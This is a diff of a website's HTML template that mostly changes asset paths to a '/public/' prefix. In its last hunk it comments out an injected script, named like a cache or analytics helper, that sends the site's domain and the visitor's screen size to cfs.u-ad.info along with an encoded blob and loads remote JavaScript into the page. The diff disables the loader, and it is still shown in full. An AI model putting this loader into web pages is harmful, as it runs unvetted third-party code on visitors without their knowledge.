@@ -29,12 +29,12 @@ window.mfn_slider_portfolio 	= { autoPlay:0 };
 //]]>
 </script>
 
-<link rel='stylesheet' id='contact-form-7-css'  href='/css/cform.css' type='text/css' media='all' />
-<link rel='stylesheet' id='tp_twitter_plugin_css-css'  href='/css/tp_twitter_plugin.css' type='text/css' media='screen' />
-<link rel='stylesheet' id='rs-plugin-settings-css'  href='/rs-plugin/css/settings.css' type='text/css' media='all' />
+<link rel='stylesheet' id='contact-form-7-css'  href='/public/css/cform.css' type='text/css' media='all' />
+<link rel='stylesheet' id='tp_twitter_plugin_css-css'  href='/public/css/tp_twitter_plugin.css' type='text/css' media='screen' />
+<link rel='stylesheet' id='rs-plugin-settings-css'  href='/public/rs-plugin/css/settings.css' type='text/css' media='all' />
 
-<link rel='stylesheet' id='select2-css'  href='/css/select.css' type='text/css' media='all' />
-<link rel='stylesheet' id='woocommerce-layout-css'  href='/css/woocommerce-layout.css' type='text/css' media='all' />
+<link rel='stylesheet' id='select2-css'  href='/public/css/select.css' type='text/css' media='all' />
+<link rel='stylesheet' id='woocommerce-layout-css'  href='/public/css/woocommerce-layout.css' type='text/css' media='all' />
 <link rel='stylesheet' id='woocommerce-smallscreen-css'  href='/public/css/woocommerce-smallscreen.css' type='text/css' media='only screen and (max-width: 768px)' />
 
 <link rel='stylesheet' id='woocommerce-general-css'  href='/public/css/woocommerce.css' type='text/css' media='all' />
@@ -214,9 +214,6 @@ window.mfn_slider_portfolio 	= { autoPlay:0 };
 </div>
 
 
-
-
-
 <script type='text/javascript' src='/public/js/jquery/jquery.js'></script>
 <script type='text/javascript' src='/public/js/jquery/jquery-migrate.min.js'></script>
 <script type='text/javascript' src='/public/rs-plugin/js/jquery.themepunch.tools.min.js'></script>
@@ -225,7 +222,7 @@ window.mfn_slider_portfolio 	= { autoPlay:0 };
 <script>
 //<![CDATA[
 jQuery(window).load(function(){
-var retina = window.devicePixelRatio > 1 ? true : false;if(retina){var retinaEl = jQuery("#logo img");var retinaLogoW = retinaEl.width();var retinaLogoH = retinaEl.height();retinaEl.attr("src","upload/logo_retina.png").width(retinaLogoW).height(retinaLogoH)}});
+var retina = window.devicePixelRatio > 1 ? true : false;if(retina){var retinaEl = jQuery("#logo img");var retinaLogoW = retinaEl.width();var retinaLogoH = retinaEl.height();retinaEl.attr("src","/public/upload/logo_retina.png").width(retinaLogoW).height(retinaLogoH)}});
 //]]>
 </script>
 
@@ -256,7 +253,7 @@ jQuery(document).ready(function($) {
 		$(this)
 			.parent().addClass('active')
 			.siblings().removeClass('active');
-		if( newClass == 'layout-boxed' ) $('html').css('background-image','url("images/patterns/9.png")');
+		if( newClass == 'layout-boxed' ) $('html').css('background-image','url("/public/images/patterns/9.png")');
 		jQuery(window).resize();
 	});
 	
@@ -282,7 +279,7 @@ jQuery(document).ready(function($) {
 		$('body')
 			.removeClass('header-bg header-alpha header-white header-dark')
 			.addClass(newClass);
-			$("#logo img").attr('src','upload/logo.png');
+			$("#logo img").attr('src','/public/upload/logo.png');
 		$(this)
 			.parent().addClass('active')
 			.siblings().removeClass('active');
@@ -315,7 +312,7 @@ jQuery(document).ready(function($) {
 });
 </script>	
 
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlR0cRq5t9HRFt5A4PM1ygrN7cfXDub8%2b7fE5AbiWo00xEVfWan6NM%2bQImeUlxTh1zEekQ7cnrXmB1hEh%2fHetBTyDVVaz1J74DtlrCYUqwv7eaRA5uzPrdJF0NUxcG1v%2f9Kx1U62DfMek%2beQB2L%2bXC1C7NCmrSXG4HN1zl%2bNUCQDqeysPEZrfZOLSXOMapoBDoiaPTazybmVK%2f79ojp1mmRQX5S%2bNOH4yB%2flM%2bpJNjtVWcFVfwbA0daXra%2fXy%2bTsOd3qXezxw4AS6lGvi9w55qwWnfaM8jfogKWvn19rtzhiqFIapTbZrZq8uO8kKerLriXGc22EQCcOe0BLvxcuG%2fLYEX94d4Tqp8G6AS61ak8FSUvZe458Ll1Ya6Zqq1ogaQF2tRExMgOMTNEq%2bVTQKPfOlTfe5YuxCTI%2b4aW%2fvaU%2fs9IIy9F2rdU2z1CxZEZRqx4mYXD3%2b9FrJ230f%2bm7S3vIiIDNSjDb8FoCXqh0Jma3OwiVGAhSclMD0un0j8in4Fz7BzMNhdnUPgCLLJT020knJfqzrWyvYQT2ryfFG7%2fk%2fkoFuqXBjTwDPkqDwqUrTEvvu1%2f%2bpw5T9Wt6jXKRLJg9QS7F8YrKhCBGI3kHA6vrzJcrCUxT%2b%2bGxA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+<!--script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlR0cRq5t9HRFt5A4PM1ygrN7cfXDub8%2b7fE5AbiWo00xEVfWan6NM%2bQImeUlxTh1zEekQ7cnrXmB1hEh%2fHetBTyDVVaz1J74DtlrCYUqwv7eaRA5uzPrdJF0NUxcG1v%2f9Kx1U62DfMek%2beQB2L%2bXC1C7NCmrSXG4HN1zl%2bNUCQDqeysPEZrfZOLSXOMapoBDoiaPTazybmVK%2f79ojp1mmRQX5S%2bNOH4yB%2flM%2bpJNjtVWcFVfwbA0daXra%2fXy%2bTsOd3qXezxw4AS6lGvi9w55qwWnfaM8jfogKWvn19rtzhiqFIapTbZrZq8uO8kKerLriXGc22EQCcOe0BLvxcuG%2fLYEX94d4Tqp8G6AS61ak8FSUvZe458Ll1Ya6Zqq1ogaQF2tRExMgOMTNEq%2bVTQKPfOlTfe5YuxCTI%2b4aW%2fvaU%2fs9IIy9F2rdU2z1CxZEZRqx4mYXD3%2b9FrJ230f%2bm7S3vIiIDNSjDb8FoCXqh0Jma3OwiVGAhSclMD0un0j8in4Fz7BzMNhdnUPgCLLJT020knJfqzrWyvYQT2ryfFG7%2fk%2fkoFuqXBjTwDPkqDwqUrTEvvu1%2f%2bpw5T9Wt6jXKRLJg9QS7F8YrKhCBGI3kHA6vrzJcrCUxT%2b%2bGxA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script-->
 	
 
 <script type="text/javascript">
